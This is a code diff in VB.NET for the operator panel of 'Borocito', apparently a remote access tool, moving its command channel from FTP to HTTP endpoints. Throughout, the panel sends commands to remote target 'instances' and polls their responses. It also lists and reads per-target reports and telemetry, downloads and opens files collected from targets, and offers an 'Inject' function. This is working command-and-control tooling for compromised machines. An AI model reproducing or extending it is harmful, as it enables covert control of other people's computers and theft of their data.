@@ -1,5 +1,5 @@
-﻿Imports System.IO
-Imports System.Net
+﻿Imports System.Net
+Imports System.Net.Http
 Public Class Main
     Dim IsThreadReadCMDServerRunning As Boolean = False
     Dim ThreadReadCMDServer As Threading.Thread = New Threading.Thread(New Threading.ThreadStart(AddressOf ReadCommandFile))
@@ -14,10 +14,8 @@ Public Class Main
         ReadParameters(parameters)
     End Sub
     Private Sub Main_HelpRequested(sender As Object, hlpevent As HelpEventArgs) Handles Me.HelpRequested
-        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Series", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
-            Process.Start("https://github.com/Zhenboro/Borocito")
-            Threading.Thread.Sleep(500)
-            Process.Start("https://github.com/Zhenboro")
+        If MessageBox.Show("Borocito fue creado y desarrollado por Zhenboro." & vbCrLf & "¿Desea visitar el sitio oficial?", "Borocito Software", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = DialogResult.Yes Then
+            Process.Start("https://github.com/Borocito")
         End If
     End Sub
     Private Sub LoaderTimer_Tick(sender As Object, e As EventArgs) Handles LoaderTimer.Tick
@@ -177,33 +175,38 @@ Public Class Main
     Sub ReadCommandFile()
         While True
             Try
-                Dim LocalCommandFile As String = DIRCommons & "\[" & userIDTarget & "]Command.str"
-                Dim RemoteCommandFile As String = HttpOwnerServer & "/Users/Commands/[" & userIDTarget & "]Command.str"
                 Threading.Thread.Sleep(CommandRefreshDelay) '10 segundos
-                If My.Computer.FileSystem.FileExists(LocalCommandFile) Then
-                    My.Computer.FileSystem.DeleteFile(LocalCommandFile)
-                End If
-                My.Computer.Network.DownloadFile(RemoteCommandFile, LocalCommandFile)
-                If Not isCommandFileBusy Then
-                    'Actualizamos el contenido del fichero de comando directo (para el multiCanal)
-                    If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
-                        My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
+
+                Dim respuestas As String = Nothing
+
+                'Descargar respuesta
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                    Dim response As HttpResponseMessage = client.GetAsync(
+                        HttpOwnerServer & "/control/instance/" & userIDTarget
+                    ).Result
+
+                    Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                    If response.IsSuccessStatusCode Then
+                        respuestas = respuestaTexto
                     End If
-                    My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", My.Computer.FileSystem.ReadAllText(LocalCommandFile), False)
-                End If
+                End Using
+
+                Dim respuesta As String() = Split(respuestas, vbCrLf)
+                Dim contenido As String = String.Join(vbNewLine, respuesta, 1, respuesta.Length - 1).Replace(vbCrLf, "")
                 'Leer
-                Dim RAW_Response As String() = IO.File.ReadAllLines(LocalCommandFile)
-                Dim TheResponse As String = LeerFicheroDesdeLinea(6, LocalCommandFile)
-                If TheResponse = LastUserResponse Then
-                    If TheResponse <> Nothing Then
-                        SetCMDStatus(Nothing, "The response (" & TheResponse & ") is equal to last", False)
+                If respuestas = LastUserResponse Then
+                    If respuestas <> Nothing Then
+                        SetCMDStatus(Nothing, "The response (" & contenido & ") is equal to last", False)
                     Else
-                        SetCMDStatus(Nothing, "The command (" & IO.File.ReadAllLines(LocalCommandFile)(1).Split(">"c)(1).Trim() & ")  is equal to last", False)
+                        SetCMDStatus(Nothing, "No changes", False)
                     End If
                 Else
-                    LastUserResponse = TheResponse
-                    If LastUserResponse <> Nothing Or LastUserResponse <> TheResponse Then
-                        SetCMDStatus(vbCrLf & RAW_Response(0).Split("|")(1) & ": " & LastUserResponse, Nothing)
+                    LastUserResponse = respuestas
+                    If LastUserResponse <> Nothing Or LastUserResponse <> contenido Then
+                        SetCMDStatus(vbCrLf & respuestas.Split(vbCrLf)(0).Split("|")(1) & ": " & contenido & vbCrLf, Nothing)
                     End If
                 End If
             Catch ex As Exception
@@ -214,27 +217,22 @@ Public Class Main
     Sub SendCommandFile(ByVal user As String, ByVal command As String)
         isCommandFileBusy = True
         Status_Label.Text = "Sending command..."
-        user = user.Replace("userID_", Nothing)
-        user = user.Replace(".rtp", Nothing)
         userIDTarget = user
         Try
-            Dim Lineas = IO.File.ReadAllLines(DIRCommons & "\userCommand.str")
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\userCommand.str") Then
-                My.Computer.FileSystem.DeleteFile(DIRCommons & "\userCommand.str")
-            End If
-            Dim commandHeader As String = Lineas(0).Trim() 'header
-            Dim secundaryCommand As String = Lineas(2).Split(">"c)(1).Trim() 'Comando secundario
-            Dim persistentCommand As String = Lineas(3).Split(">"c)(1).Trim() 'Comando persistente
-            If Not isMonoChannel Then
-                secundaryCommand = InputBox("Set secundary command", "Multi channel " & userIDTarget, secundaryCommand)
-                persistentCommand = InputBox("Set persistent command", "Multi channel " & userIDTarget, persistentCommand)
-            End If
-            My.Computer.FileSystem.WriteAllText(DIRCommons & "\userCommand.str", commandHeader &
-                                                    vbCrLf & "Command1>" & command &
-                                                    vbCrLf & "Command2>" & secundaryCommand &
-                                                    vbCrLf & "Command3>" & persistentCommand &
-                                                    vbCrLf & "[Response]", False)
-            My.Computer.Network.UploadFile(DIRCommons & "\userCommand.str", HostOwnerServer & "/Users/Commands/[" & user & "]Command.str", HostOwnerServerUser, HostOwnerServerPassword)
+            'Enviar el contenido
+            Dim formData As New Dictionary(Of String, String) From {
+                {"command", command}
+            }
+            Using content As New FormUrlEncodedContent(formData)
+                Using client As New HttpClient()
+                    client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+                    Dim response As HttpResponseMessage = client.PostAsync(
+                            HttpOwnerServer & "/control/instance/" & userIDTarget,
+                            content
+                        ).Result
+                End Using
+            End Using
+
             If Not isMultiSelectMode Then
                 Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Server: Command Sended! (" & command & ")")
             End If
@@ -246,30 +244,6 @@ Public Class Main
         End Try
         isCommandFileBusy = False
     End Sub
-    Private Function LeerFicheroDesdeLinea(ByVal numeroLinea As Integer, ByVal nombreFichero As String) As String
-        Dim fichero As New System.IO.FileInfo(nombreFichero)
-        LeerFicheroDesdeLinea = Nothing
-        If fichero.Exists Then
-            Dim sr As System.IO.StreamReader = Nothing
-            Dim lineaActual As Integer = 1
-            Try
-                sr = New System.IO.StreamReader(fichero.FullName)
-                While lineaActual < numeroLinea And Not sr.EndOfStream
-                    sr.ReadLine()
-                    lineaActual += 1
-                End While
-                LeerFicheroDesdeLinea = sr.ReadToEnd
-            Catch ex As Exception
-                Main_Users_Command_RichTextBox.AppendText(vbCrLf & "Error: " & ex.Message)
-                Console.WriteLine("[LeerFicheroDesdeLinea@Main]Error: " & ex.Message)
-            Finally
-                If sr IsNot Nothing Then
-                    sr.Close()
-                    sr.Dispose()
-                End If
-            End Try
-        End If
-    End Function
 
     Private Sub Main_Inject_Button_Click(sender As Object, e As EventArgs) Handles Main_Inject_Button.Click
         Dim injectableOpener As New OpenFileDialog
@@ -342,26 +316,28 @@ Public Class Main
         Try
             Main_Users_User_ListBox.Items.Clear()
             Status_Label.Text = "WAIT: Loading user files from server..."
-            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Users"), FtpWebRequest)
-            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
-            dirFtp.Credentials = cr
-            dirFtp.Method = "LIST"
-            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
-            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
-            Dim res As String = reader.ReadToEnd()
-            Dim TXVR As New TextBox
-            TXVR.Text = res.ToString
-            Dim lineas As String() = TXVR.Lines()
+
+            Dim instancias As String = Nothing
+
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                Dim response As HttpResponseMessage = client.GetAsync(
+                    HttpOwnerServer & "/control/list/instances"
+                ).Result
+
+                Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                If response.IsSuccessStatusCode Then
+                    instancias = respuestaTexto
+                End If
+            End Using
+
+            Dim lineas As String() = instancias.Split("|")
             For Each linea As String In lineas
-                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
-                linea = linea.Replace(".rtp", Nothing)
-                linea = linea.Replace("userID_", Nothing)
                 Main_Users_User_ListBox.Items.Add(linea)
             Next
-            Main_Users_User_ListBox.Items.Remove(".")
-            Main_Users_User_ListBox.Items.Remove("..")
-            Main_Users_User_ListBox.Items.Remove("Commands")
-            reader.Close()
+
             Status_Label.Text = "User files loaded!"
         Catch ex As Exception
             Status_Label.Text = AddToLog("IndexUsersToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
@@ -371,26 +347,28 @@ Public Class Main
         Try
             Main_Telemetry_Telemetry_ListBox.Items.Clear()
             Status_Label.Text = "WAIT: Loading telemetry files from server..."
-            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Telemetry"), FtpWebRequest)
-            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
-            dirFtp.Credentials = cr
-            dirFtp.Method = "LIST"
-            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
-            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
-            Dim res As String = reader.ReadToEnd()
-            Dim TXVR As New TextBox
-            TXVR.Text = res.ToString
-            Dim lineas As String() = TXVR.Lines()
+
+            Dim registros As String = Nothing
+
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                Dim response As HttpResponseMessage = client.GetAsync(
+                    HttpOwnerServer & "/control/list/telemetry-logs"
+                ).Result
+
+                Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                If response.IsSuccessStatusCode Then
+                    registros = respuestaTexto
+                End If
+            End Using
+
+            Dim lineas As String() = registros.Split(vbCrLf)
             For Each linea As String In lineas
-                linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
-                linea = linea.Replace(".tlm", Nothing)
-                linea = linea.Replace("telemetry_", Nothing)
-                Main_Telemetry_Telemetry_ListBox.Items.Add(linea)
+                Main_Telemetry_Telemetry_ListBox.Items.Add(linea.Replace(vbLf, ""))
             Next
-            Main_Telemetry_Telemetry_ListBox.Items.Remove(".")
-            Main_Telemetry_Telemetry_ListBox.Items.Remove("..")
-            Main_Telemetry_Telemetry_ListBox.Items.Remove("tlmRefresh.php")
-            reader.Close()
+
             Status_Label.Text = "Telemetry files loaded!"
         Catch ex As Exception
             Status_Label.Text = AddToLog("IndexTelemetryToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
@@ -400,23 +378,29 @@ Public Class Main
         Try
             Main_Telemetry_Files_ListBox.Items.Clear()
             Status_Label.Text = "WAIT: Loading repository files from server..."
-            Dim dirFtp As FtpWebRequest = CType(FtpWebRequest.Create(HostOwnerServer & "/Files"), FtpWebRequest)
-            Dim cr As New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
-            dirFtp.Credentials = cr
-            dirFtp.Method = "LIST"
-            dirFtp.Method = WebRequestMethods.Ftp.ListDirectory
-            Dim reader As New StreamReader(dirFtp.GetResponse().GetResponseStream())
-            Dim res As String = reader.ReadToEnd()
-            Dim TXVR As New TextBox
-            TXVR.Text = res.ToString
-            Dim lineas As String() = TXVR.Lines()
+
+            Dim archivos As String = Nothing
+
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                Dim response As HttpResponseMessage = client.GetAsync(
+                    HttpOwnerServer & "/control/list/telemetry-files"
+                ).Result
+
+                Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                If response.IsSuccessStatusCode Then
+                    archivos = respuestaTexto
+                End If
+            End Using
+
+            Dim lineas As String() = archivos.Split(vbCrLf)
             For Each linea As String In lineas
                 linea = linea.Remove(0, linea.LastIndexOf("/") + 1)
-                Main_Telemetry_Files_ListBox.Items.Add(linea)
+                Main_Telemetry_Files_ListBox.Items.Add(linea.Replace(vbLf, ""))
             Next
-            Main_Telemetry_Files_ListBox.Items.Remove(".")
-            Main_Telemetry_Files_ListBox.Items.Remove("..")
-            reader.Close()
+
             Status_Label.Text = "Telemetry repository files loaded!"
         Catch ex As Exception
             Status_Label.Text = AddToLog("IndexTelemetryFilesToPanel@(LocalThings@Main)Network", "Error: " & ex.Message, True)
@@ -424,6 +408,7 @@ Public Class Main
     End Sub
     Sub DeleteTelemetryFile(ByVal fileName As String)
         Try
+            ' TODO
             Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Files/" & fileName), FtpWebRequest)
             request.Method = WebRequestMethods.Ftp.DeleteFile
             request.Credentials = New NetworkCredential(HostOwnerServerUser, HostOwnerServerPassword)
@@ -437,6 +422,7 @@ Public Class Main
     Sub DeleteUserFile(ByVal user As String)
         user = user.Replace("userID_", Nothing)
         Try
+            ' TODO
             Try
                 Dim request As FtpWebRequest = CType(WebRequest.Create(HostOwnerServer & "/Users/userID_" & user & ".rtp"), FtpWebRequest)
                 request.Method = WebRequestMethods.Ftp.DeleteFile
@@ -473,23 +459,36 @@ Public Class Main
     End Sub
     Sub GetTelemetryInfo(ByVal fileName As String)
         Try
-            Dim LocalTelemetryFile As String = DIRCommons & "\telemetry_" & fileName & ".tlm"
-            Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Telemetry/telemetry_" & fileName & ".tlm"
-            If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
-                My.Computer.FileSystem.DeleteFile(LocalTelemetryFile)
-            End If
-            My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
-            Main_Telemetry_Telemetry_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalTelemetryFile)
+            Dim registros As String = Nothing
+
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                Dim response As HttpResponseMessage = client.GetAsync(
+                    HttpOwnerServer & "/control/get/telemetry-log/" & fileName.Replace(".log", "")
+                ).Result
+
+                Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                If response.IsSuccessStatusCode Then
+                    registros = respuestaTexto
+                End If
+            End Using
+
+            Main_Telemetry_Telemetry_RichTextBox.Text = registros
         Catch ex As Exception
             Status_Label.Text = AddToLog("GetTelemetryInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
         End Try
     End Sub
     Sub GetTelemetryFile(ByVal file As String)
         Try
+            ' TODO : descargar archivo
             Dim downloadRefresh As Boolean = False
             Status_Label.Text = "WAIT: Asking file info..."
+
             Dim LocalTelemetryFile As String = DIRCommons & "\" & file
             Dim RemoteTelemetryFile As String = HttpOwnerServer & "/Files/" & file
+
             If My.Computer.FileSystem.FileExists(LocalTelemetryFile) Then
                 If MessageBox.Show("El fichero ya existe en local." & vbCrLf & "¿Desea descargarlo nuevamente?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                     Status_Label.Text = "WAIT: Downloading file from remote repository..."
@@ -506,6 +505,7 @@ Public Class Main
                     My.Computer.Network.DownloadFile(RemoteTelemetryFile, LocalTelemetryFile)
                 End If
             End If
+
             Status_Label.Text = "File ready! Asking for confirmation..."
             If MessageBox.Show("¿Abrir el fichero '" & file & "'?", "Confirmar", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = DialogResult.Yes Then
                 Process.Start(LocalTelemetryFile)
@@ -519,13 +519,23 @@ Public Class Main
     End Sub
     Sub GetUserInfo()
         Try
-            Dim LocalUserFile As String = DIRCommons & "\userID_" & userIDTarget & ".rtp"
-            Dim RemoteUserFile As String = HttpOwnerServer & "/Users/userID_" & userIDTarget & ".rtp"
-            If My.Computer.FileSystem.FileExists(LocalUserFile) Then
-                My.Computer.FileSystem.DeleteFile(LocalUserFile)
-            End If
-            My.Computer.Network.DownloadFile(RemoteUserFile, LocalUserFile)
-            Main_Users_User_RichTextBox.Text = My.Computer.FileSystem.ReadAllText(LocalUserFile)
+            Dim reporte As String = Nothing
+
+            Using client As New HttpClient()
+                client.DefaultRequestHeaders.Add("User-Agent", AssemblyInformation)
+
+                Dim response As HttpResponseMessage = client.GetAsync(
+                    HttpOwnerServer & "/control/get/report/" & userIDTarget
+                ).Result
+
+                Dim respuestaTexto As String = response.Content.ReadAsStringAsync().Result
+
+                If response.IsSuccessStatusCode Then
+                    reporte = respuestaTexto
+                End If
+            End Using
+
+            Main_Users_User_RichTextBox.Text = reporte
         Catch ex As Exception
             Status_Label.Text = AddToLog("GetUserInfo@(LocalThings@Main)Network", "Error: " & ex.Message, True)
         End Try
